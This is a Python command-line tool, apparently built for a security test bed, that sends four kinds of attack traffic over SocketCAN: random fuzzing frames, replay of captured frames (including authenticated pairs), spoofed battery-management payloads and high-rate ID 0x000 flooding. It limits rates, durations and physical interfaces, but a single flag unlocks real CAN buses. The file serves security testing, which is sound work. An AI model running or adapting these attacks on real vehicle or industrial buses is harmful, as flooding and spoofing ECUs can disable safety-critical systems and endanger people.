#!/usr/bin/env python3
"""Bounded four-attack SocketCAN CLI for FR-SEC-005 test beds.

This tool is intentionally fail-closed on physical interfaces.  It does not
create an interface, change bitrate, stop an ECU, or claim measured bus load.
"""

from __future__ import annotations

import argparse
import json
import random
import re
import time
import uuid
from pathlib import Path

from security.can_socket import SocketCanTransport


ATTACKS = ("fuzzy", "replay", "spoofing", "flooding")
DEFAULT_RATES = {"fuzzy": 500.0, "replay": 20.0, "spoofing": 12.0, "flooding": 3000.0}
MAX_RATE = 4000.0
MAX_PHYSICAL_DURATION_S = 10.0
SPOOFED_BMS = bytes.fromhex("C8 BE 10 68 FF EC 41 00")
FLOOD_PAYLOAD = bytes(8)


def is_virtual_interface(interface: str) -> bool:
    return re.fullmatch(r"vcan[0-9]+", interface) is not None


def validate_interface(interface: str) -> None:
    if re.fullmatch(r"(?:v?can)[0-9]+", interface) is None:
        raise ValueError("interface must be canN or vcanN")


def validate_safety(interface: str, duration_s: float, rate_hz: float,
                    confirmed_test_bus: bool) -> None:
    validate_interface(interface)
    if not 0 < duration_s <= 60.0:
        raise ValueError("duration must be in (0, 60] seconds")
    if not 0 < rate_hz <= MAX_RATE:
        raise ValueError(f"rate must be in (0, {MAX_RATE:g}] frames/s")
    if not is_virtual_interface(interface):
        if not confirmed_test_bus:
            raise ValueError("physical CAN requires --confirm-isolated-test-bus")
        if duration_s > MAX_PHYSICAL_DURATION_S:
            raise ValueError("physical CAN duration must not exceed 10 seconds")


def parse_payload(value: str) -> bytes:
    try:
        payload = bytes.fromhex(value)
    except ValueError as error:
        raise argparse.ArgumentTypeError("payload must be hexadecimal") from error
    if len(payload) != 8:
        raise argparse.ArgumentTypeError("replay payload must contain exactly 8 bytes")
    return payload


def build_attack_frame(attack: str, rng: random.Random,
                       replay_payload: bytes | None = None) -> tuple[int, bytes]:
    if attack == "fuzzy":
        return rng.randrange(0x800), bytes(rng.getrandbits(8) for _ in range(8))
    if attack == "replay":
        if replay_payload is None:
            raise ValueError("replay requires a captured or supplied payload")
        return 0x100, replay_payload
    if attack == "spoofing":
        return 0x100, SPOOFED_BMS
    if attack == "flooding":
        return 0x000, FLOOD_PAYLOAD
    raise ValueError(f"unsupported attack: {attack}")


def capture_replay_payload(transport: SocketCanTransport, timeout_s: float) -> bytes:
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        frame = transport.receive()
        if frame and not (frame.extended or frame.remote or frame.error) \
                and frame.can_id == 0x100 and frame.dlc == 8:
            return frame.data
    raise TimeoutError("no standard 8-byte 0x100 frame observed before capture timeout")


def capture_replay_pair(transport, timeout_s):
    deadline = time.monotonic() + timeout_s
    original, received_at = None, None
    while time.monotonic() < deadline:
        frame = transport.receive()
        if not frame or frame.extended or frame.remote or frame.error or frame.dlc != 8:
            continue
        if frame.can_id == 0x100:
            original, received_at = frame.data, time.monotonic()
        elif frame.can_id == 0x102 and original is not None and time.monotonic()-received_at < 0.1:
            return original, frame.data
    raise TimeoutError("no 0x100/0x102 pair observed before capture timeout")


def write_new_json(path: str | None, value: dict) -> None:
    if not path:
        return
    with Path(path).open("x", encoding="utf-8") as stream:
        json.dump(value, stream, indent=2, sort_keys=True)
        stream.write("\n")


def run_attack(args: argparse.Namespace, transport: SocketCanTransport, progress=None, journal=None) -> dict:
    rate = args.rate if args.rate is not None else DEFAULT_RATES[args.attack_type]
    paired = args.attack_type == 'replay' and getattr(args,'replay_mode','raw') == 'authenticated-pair'
    validate_safety(args.interface, args.duration, rate*(2 if paired else 1), args.confirm_isolated_test_bus)
    rng = random.Random(args.seed)
    replay_payload = args.replay_payload
    replay_auth = None
    result = progress if progress is not None else {}
    result.update({"run_id": args.run_id or str(uuid.uuid4()), "trial": args.trial,
                   "protocol": "ICD-v1.6", "environment": "vcan" if is_virtual_interface(args.interface) else "physical-can",
                   "interface": args.interface, "attack_type": args.attack_type,
                   "seed": args.seed, "requested_duration_s": args.duration,
                   "requested_rate_fps": rate*(2 if paired else 1),
                   "requested_rate_pairs_per_s": rate if paired else None, "sent_frames": 0,
                   "first_tx_accepted_epoch_ns": None, "first_tx_accepted_monotonic_ns": None,
                   "last_tx_accepted_monotonic_ns": None, "measured_bus_load_percent": None,
                   "timestamp_semantics": "socket-send-accepted; bus reception must be observed separately"})
    if args.attack_type == "replay" and getattr(args, "replay_mode", "raw") == "authenticated-pair":
        if replay_payload is not None:
            raise ValueError("authenticated replay captures a pair; omit --replay-payload")
        if getattr(args, "replay_pair_file", None):
            pair=json.loads(Path(args.replay_pair_file).read_text(encoding="utf-8"))
            replay_payload, replay_auth = parse_payload(pair["raw"]), parse_payload(pair["auth"])
        else:
            replay_payload, replay_auth = capture_replay_pair(transport, args.capture_timeout)
            time.sleep(getattr(args, "replay_delay", 0.3))
    if args.attack_type == "replay" and replay_payload is None:
        replay_payload = capture_replay_payload(transport, args.capture_timeout)

    period = 1.0 / rate
    deadline = time.monotonic() + args.duration
    next_send = time.monotonic()
    sent = 0
    first_epoch_ns = None
    first_monotonic_ns = None
    last_monotonic_ns = None
    while time.monotonic() < deadline:
        now = time.monotonic()
        if now < next_send:
            time.sleep(min(next_send, deadline) - now)
            if time.monotonic() >= deadline:
                break
        can_id, payload = build_attack_frame(args.attack_type, rng, replay_payload)
        pair = [(can_id, payload)] + ([(0x102, replay_auth)] if replay_auth is not None else [])
        for index, (frame_id, frame_payload) in enumerate(pair):
            if index:
                time.sleep(0.002)
            transport.send(frame_id, frame_payload)
            accepted_ns, epoch_ns = time.monotonic_ns(), time.time_ns()
            if sent == 0:
                first_epoch_ns, first_monotonic_ns = epoch_ns, accepted_ns
            last_monotonic_ns = accepted_ns
            sent += 1
            result.update(sent_frames=sent, first_tx_accepted_epoch_ns=first_epoch_ns,
                          first_tx_accepted_monotonic_ns=first_monotonic_ns,
                          last_tx_accepted_monotonic_ns=last_monotonic_ns)
            if journal:
                journal.write(json.dumps({"result":"TX_ACCEPTED","run_id":result["run_id"],
                    "can_id":frame_id,"data":frame_payload.hex(),"monotonic_ns":accepted_ns,
                    "epoch_ns":epoch_ns})+"\n")
        next_send += period

    return result


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Bounded four-attack SocketCAN test tool")
    parser.add_argument("--type", dest="attack_type", choices=ATTACKS, required=True)
    parser.add_argument("--channel", dest="interface", default="vcan0")
    parser.add_argument("--duration", type=float, default=3.0)
    parser.add_argument("--rate", type=float)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--trial", type=int, default=0)
    parser.add_argument("--run-id")
    parser.add_argument("--log", help="new JSON manifest path; existing files are not overwritten")
    parser.add_argument("--replay-payload", type=parse_payload,
                        help="exact 8-byte 0x100 payload; otherwise capture one from the bus")
    parser.add_argument("--capture-timeout", type=float, default=5.0)
    parser.add_argument("--replay-mode", choices=("raw", "authenticated-pair"), default="raw")
    parser.add_argument("--replay-delay", type=float, default=0.3)
    parser.add_argument("--replay-pair-file", help="previously captured raw/auth JSON pair")
    parser.add_argument("--confirm-isolated-test-bus", action="store_true",
                        help="required for canN; confirms a disconnected, authorized test bus")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    explicit_run_id=args.run_id
    result = {"run_id": args.run_id or str(uuid.uuid4()), "trial":args.trial,
              "status":"INVALID", "sent_frames":0}
    args.run_id=result['run_id']
    log_output = journal = None
    code = 2
    try:
        if args.trial < 0 or not 0 < args.capture_timeout <= 30:
            raise ValueError("trial must be non-negative and capture timeout in (0, 30]")
        rate = args.rate if args.rate is not None else DEFAULT_RATES[args.attack_type]
        paired = args.attack_type == 'replay' and args.replay_mode == 'authenticated-pair'
        validate_safety(args.interface, args.duration, rate*(2 if paired else 1), args.confirm_isolated_test_bus)
        if not is_virtual_interface(args.interface) and not explicit_run_id:
            raise ValueError("physical CAN requires an explicit --run-id")
        if not is_virtual_interface(args.interface) and not args.log:
            raise ValueError("physical CAN requires --log")
        if not 0.1 <= args.replay_delay <= 5:
            raise ValueError("replay delay must be in [0.1, 5] seconds")
        if args.replay_mode != "raw" and args.attack_type != "replay":
            raise ValueError("authenticated-pair mode requires --type replay")
        if args.replay_pair_file and not paired:
            raise ValueError('--replay-pair-file requires authenticated-pair replay mode')
        if args.log:
            log_output = Path(args.log).open("x", encoding="utf-8")
            journal = Path(args.log + ".journal.jsonl").open("x", encoding="utf-8")
            json.dump(result,log_output); log_output.flush()
            journal.write(json.dumps({"result":"START","run_id":result["run_id"]})+"\n");journal.flush()
        with SocketCanTransport(args.interface) as transport:
            run_attack(args, transport, result, journal)
        result["status"] = "COMPLETE"
        code = 0
    except KeyboardInterrupt:
        result.update(status="INTERRUPTED", error="operator interrupted")
        code = 130
    except (OSError, RuntimeError, TimeoutError, ValueError, KeyError, TypeError, argparse.ArgumentTypeError) as error:
        result.update(status="INVALID", error=str(error))
    finally:
        if log_output:
            log_output.seek(0); log_output.truncate();json.dump(result,log_output,indent=2);log_output.close()
        if journal:
            journal.write(json.dumps({"result":"END","status":result["status"],"sent_frames":result["sent_frames"]})+"\n")
            journal.close()
    print(json.dumps(result, sort_keys=True))
    return code


if __name__ == "__main__":
    raise SystemExit(main())
